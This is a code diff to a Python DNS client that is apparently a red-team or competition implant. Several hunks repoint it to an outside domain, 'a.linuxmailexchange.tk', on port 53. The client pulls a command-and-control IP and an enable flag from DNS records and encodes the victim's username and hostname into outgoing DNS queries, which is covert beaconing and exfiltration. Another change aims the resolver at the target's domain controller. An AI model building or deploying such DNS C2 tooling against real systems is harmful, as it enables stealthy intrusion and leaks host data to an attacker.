@@ -8,7 +8,7 @@
 
 SERVER = "127.0.0.1"
 # SERVER = "8.8.8.8"
-TARGET_FQDN = "a.team8.cybertigers.club"
+TARGET_FQDN = "a.linuxmailexchange.tk"
 dnsResult = False
 c2IP = "samplec2.ists."
 c2enabled = True
@@ -522,8 +522,7 @@ class DNSClient:
         '''connection
         '''
         try:
-            self.socket.connect((server, 5354))
-            #todo: change this back after testing
+            self.socket.connect((server, 53))
         except Exception:
             print('Unable to connect to server {0}'.format(server))
             return False
@@ -563,11 +562,11 @@ class DNSClient:
             format.print_result()
             results = format.get_results()
             if len(results) > 0:
-                if request == "c2.":
+                if request == "c2.a.linuxmailexchange.tk.":
                     c2IP = results
                     self.socket.close()
                     return
-                if request == "c2e.":
+                if request == "c2e.a.linuxmailexchange.tk.":
                     c2enabled = (results == "yes.")
                     self.socket.close()
                     return
@@ -598,9 +597,8 @@ def dnsRun(dest):
     machineIP = socket.getfqdn()  # should get full hostname/domain name
     requestName = username + "AT." + machineIP + "." + TARGET_FQDN
     # print("Requesting:", requestName)
-    client.send_query("c2.", recursion_desired=True, debug_mode=False)
-    client.send_query("c2e.", recursion_desired=True, debug_mode=False)
-    #todo: fqdns for c2
+    client.send_query("c2.a.linuxmailexchange.tk.", recursion_desired=True, debug_mode=False)
+    client.send_query("c2e.a.linuxmailexchange.tk.", recursion_desired=True, debug_mode=False)
     client.send_query(requestName, recursion_desired=True, debug_mode=False)
     client.disconnect()
 
@@ -638,7 +636,8 @@ def windowsResolv():
     fqdn = socket.getfqdn()
     parts = fqdn.split(".")
     if len(parts) > 1:
-        return "ns."+parts[1:]
+        #try to hit their DC
+        return "lordnikon."+ ".".join(parts[1:])
     return "localhost" #It's worth a try?
 
 def combine(lst):
@@ -683,8 +682,6 @@ def main():
     parser.add_argument("--systemd", help="Take input and timing from SystemD rather than running automatically by itself.", action="store_true")
     #parser.add_argument('-D', "--dns", help="Use DNS", action="store_true")  #We'll always run DNS
     parser.add_argument("-S", "--smtp", help="Use SMTP", action="store_true")
-    parser.add_argument("-i", "--install", help="Install new settings.", action="store_true")
-    #todo: implement install
     parser.add_argument('hostname', help="The hostname or IP of the destination server")
     args = parser.parse_args()
 
